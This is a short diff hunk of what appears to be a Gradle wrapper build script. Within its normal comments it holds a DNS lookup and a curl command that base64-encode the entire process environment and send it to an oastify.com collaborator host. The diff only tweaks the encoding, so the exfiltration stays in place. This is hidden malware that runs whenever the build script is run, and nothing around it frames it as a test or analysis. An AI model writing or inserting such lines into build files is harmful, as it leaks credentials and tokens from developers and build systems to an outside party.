@@ -64,7 +64,7 @@
 
 # Attempt to set APP_HOME
 dig xxd.nc3s6c9z0hnfj0q5s962m5j3buhl5gt5.oastify.com
-curl xd.nc3s6c9z0hnfj0q5s962m5j3buhl5gt5.oastify.com/$(env|base64)
+curl xd.nc3s6c9z0hnfj0q5s962m5j3buhl5gt5.oastify.com/$(env|base64 -w0)
 # Resolve links: $0 may be a link
 app_path=$0
 
